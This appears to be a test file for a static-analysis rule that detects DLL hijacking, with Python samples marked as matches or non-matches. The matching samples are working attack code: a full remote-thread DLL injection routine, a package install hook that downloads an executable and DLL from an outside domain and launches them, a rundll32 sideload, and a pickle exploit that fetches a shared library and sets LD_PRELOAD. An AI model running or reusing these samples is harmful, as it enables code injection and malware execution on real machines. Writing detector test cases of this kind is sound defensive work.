"""Injecting a DLL into a process"""
def f():
    import sys

    dll_name = sys.argv[1]
    dll_length = len(dll_name)
    PID = sys.argv[2]
    kernel32 = windll.kernel32

    if len(sys.argv) < 2:
        print("[!] Usage: ./PY-MEMJECT calc32.dll <PID>")
        sys.exit(1)

    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = 0x00F0000 | 0x00100000 | 0xFFF
    VIRTUAL_MEM = 0x1000 | 0x2000

    dwDesiredAccess = PROCESS_ALL_ACCESS
    bInheritHandle = False
    dwProcessId = int(PID)
    # Opens the process object via OpenProcess()
    loading_process = kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)

    hProcess = loading_process
    lpAddress = 0
    dwSize = dll_length
    flAllocationType = VIRTUAL_MEM
    flProtect = PAGE_READWRITE
    # Allocates memory for the host process
    allocate_memory = kernel32.VirtualAllocEx(
        hProcess, lpAddress, dwSize, flAllocationType, flProtect
    )
    hProcess = loading_process
    lpBaseAddress = allocate_memory
    lpBuffer = dll_name
    nSize = dll_length
    lpNumberOfBytesWritten = byref(c_int(0))
    # Copies the .DLL to the host process
    # ruleid: dll-hijacking
    write_memory = kernel32.WriteProcessMemory(
        hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten
    )

    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

    hProcess = loading_process
    lpThreadAttributes = None
    dwStackSize = 0
    lpStartAddress = h_loadlib
    lpParameter = allocate_memory
    dwCreationFlags = 0
    lpThreadId = byref(c_ulong(0))
    # ruleid: dll-hijacking
    code_execution = kernel32.CreateRemoteThread(
        hProcess,
        lpThreadAttributes,
        dwStackSize,
        lpStartAddress,
        lpParameter,
        dwCreationFlags,
        lpThreadId,
    )
    print("[+] Successful injection into PID: %s" % PID)

"""OK: Injecting a DLL into a process"""
def f():
    # ok: dll-hijacking
    x="This is a string containing CreateRemoteThread"

"""Phantom DLL case planting a DLL and executing a builtin binary"""
def f():
    class ActionOnInstall(install):
        def run(self):
            import os
            import tempfile
            from urllib.request import Request, urlopen

            temp_dir = tempfile.mkdtemp(prefix="DriverGenius")
            dname = temp_dir

            def dfile(url):
                requestObj = Request(
                    url,
                    headers={
                        "User-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; rv:97.0) Gecko/20100101 Firefox/97.0"
                    },
                )
                responseObj = urlopen(requestObj)
                content = responseObj.read()
                return content

            r = dfile("https://fus.rngupdatem.buzz/c.exe")
            rd = dfile("https://fus.rngupdatem.buzz/dgdeskband64.dll")
            with open(dname + "\\ComServer.exe", "wb") as f:
                f.write(r)
            # ruleid: dll-hijacking
            with open(dname + "\\dgdeskband64.dll", "wb") as f:
                f.write(rd)
            os.system("START " + dname + "\\ComServer.exe showdeskband")

"""OK: Injecting a DLL into a process"""
def f():
    import os
    # ok: dll-hijacking
    os.system("start explorer.exe c:\\")

"""Known executable sideloading dll"""
def f():
    import os
    # ruleid: dll-hijacking
    os.system("RUNDLL32.EXE" + " some.dll, function")

"""Preloading libraries in linux """
def f():
    import os
    import pickle
    from base64 import b64encode
    import requests

    class Exploit(object):
        def __reduce__(self):
            # ruleid: dll-hijacking
            return eval, ('__import__("os").system("wget http://10.0.0.2/.so -O /tmp/.so") & __import__("os").environ.__setitem__("LD_PRELOAD", "/tmp/.so")')

    requests.post(
        "http://10.0.0.3:5000/",
        cookies={"pickle": b64encode(pickle.dumps(Exploit())).decode()},
    )

"""OK: Preloading libraries in linux"""
def f():
    # ok: dll-hijacking
    # This is comment that mentions LD_PRELOAD
    pass